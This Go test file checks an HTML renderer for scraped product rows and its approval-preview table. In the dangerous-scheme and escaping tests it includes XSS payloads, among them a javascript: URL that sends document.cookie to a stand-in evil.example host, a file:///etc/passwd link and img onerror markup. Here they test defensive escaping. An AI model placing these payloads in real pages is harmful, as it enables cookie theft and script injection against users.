package engine

import (
	"strings"
	"testing"

	"github.com/vedansh/vans/internal/runner"
)

func doc() Document {
	return Document{
		Title:  "Widgets",
		Fields: []string{"product_name", "product_link", "price"},
		Rows: []runner.Row{
			{"product_name": "Widget", "product_link": "https://shop.example/p/1", "price": "$10"},
			{"product_name": "Gadget", "product_link": "https://shop.example/p/2", "price": "$20"},
		},
	}
}

func TestHTMLPutsTheTitleFirst(t *testing.T) {
	got := doc().HTML()
	if !strings.HasPrefix(got, "<h1>Widgets</h1>") {
		t.Errorf("Notes takes the note name from the first line; got %.40q", got)
	}
}

func TestHTMLLinksHTTPValues(t *testing.T) {
	got := doc().HTML()
	if !strings.Contains(got, `<a href="https://shop.example/p/1">`) {
		t.Errorf("http links were not made clickable:\n%s", got)
	}
}

// Extracted values are attacker-controlled in the ordinary case — any page can
// put whatever it likes in an href. A javascript: or data: URL rendered as a
// clickable link in the user's notes is the page reaching out of the browser
// into an app that trusts it.
func TestHTMLDoesNotLinkDangerousSchemes(t *testing.T) {
	d := doc()
	d.Rows = []runner.Row{{
		"product_name": "Free stuff",
		"product_link": "javascript:fetch('https://evil.example/'+document.cookie)",
		"price":        "$0",
	}}

	got := d.HTML()
	if strings.Contains(got, "<a href=\"javascript:") {
		t.Fatalf("a javascript: URL was rendered as a link:\n%s", got)
	}
	if !strings.Contains(got, "javascript:fetch") {
		t.Errorf("the value was dropped rather than shown as text:\n%s", got)
	}

	for _, scheme := range []string{"data:text/html,<script>x</script>", "file:///etc/passwd", "vbscript:x"} {
		d.Rows = []runner.Row{{"product_name": "x", "product_link": scheme, "price": "$0"}}
		if strings.Contains(d.HTML(), `<a href="`+scheme) {
			t.Errorf("%s was rendered as a link", scheme)
		}
	}
}

func TestHTMLEscapesEverything(t *testing.T) {
	d := doc()
	d.Title = `Widgets <script>alert(1)</script>`
	d.Rows = []runner.Row{{
		"product_name": `<img src=x onerror="alert(1)">`,
		"product_link": "https://shop.example/p/1?a=1&b=2",
		"price":        `"$10"`,
	}}

	got := d.HTML()
	if strings.Contains(got, "<script>") || strings.Contains(got, "<img") {
		t.Errorf("markup survived into the note body:\n%s", got)
	}
	if !strings.Contains(got, "&lt;script&gt;") {
		t.Errorf("the title was not escaped:\n%s", got)
	}
	if !strings.Contains(got, "a=1&amp;b=2") {
		t.Errorf("the href was not escaped:\n%s", got)
	}
}

func TestHTMLRendersEveryRowAndColumn(t *testing.T) {
	got := doc().HTML()
	for _, want := range []string{"Product Name", "Product Link", "Price", "Widget", "Gadget", "$10", "$20"} {
		if !strings.Contains(got, want) {
			t.Errorf("missing %q:\n%s", want, got)
		}
	}
	if n := strings.Count(got, "<tr>"); n != 3 {
		t.Errorf("got %d rows including the header, want 3", n)
	}
}

func TestHTMLHandlesAMissingValue(t *testing.T) {
	d := doc()
	d.Rows = []runner.Row{{"product_name": "Widget", "price": "$10"}} // no link

	got := d.HTML()
	if strings.Count(got, "<td>") != 3 {
		t.Errorf("a missing field lost its column:\n%s", got)
	}
}

// The gate asks a person to approve a write. "Write 40 rows to Notes?" is not
// a question anyone can answer; the rows are.
func TestPreviewShowsTheData(t *testing.T) {
	got := doc().Preview(5)
	for _, want := range []string{"Widgets", "Product Name", "Widget", "Gadget", "$10"} {
		if !strings.Contains(got, want) {
			t.Errorf("preview missing %q:\n%s", want, got)
		}
	}
}

func TestPreviewTruncatesAndSaysSo(t *testing.T) {
	d := doc()
	for i := 0; i < 30; i++ {
		d.Rows = append(d.Rows, runner.Row{"product_name": "More", "product_link": "", "price": "$1"})
	}

	got := d.Preview(5)
	if !strings.Contains(got, "and 27 more rows") || !strings.Contains(got, "32 total") {
		t.Errorf("preview did not report what it hid:\n%s", got)
	}
	if n := strings.Count(got, "More"); n != 3 {
		t.Errorf("preview showed %d hidden rows, want 3 of them", n)
	}
}

func TestPreviewCollapsesWhitespaceInCells(t *testing.T) {
	d := doc()
	d.Rows = []runner.Row{{"product_name": "Wide\n\n  Widget", "product_link": "", "price": "$10"}}

	if got := d.Preview(5); !strings.Contains(got, "Wide Widget") {
		t.Errorf("a multiline value broke the table:\n%s", got)
	}
}

func TestPrettyField(t *testing.T) {
	cases := map[string]string{
		"product_name": "Product Name",
		"price":        "Price",
		"a_b_c":        "A B C",
		"":             "",
	}
	for in, want := range cases {
		if got := prettyField(in); got != want {
			t.Errorf("prettyField(%q) = %q, want %q", in, got, want)
		}
	}
}
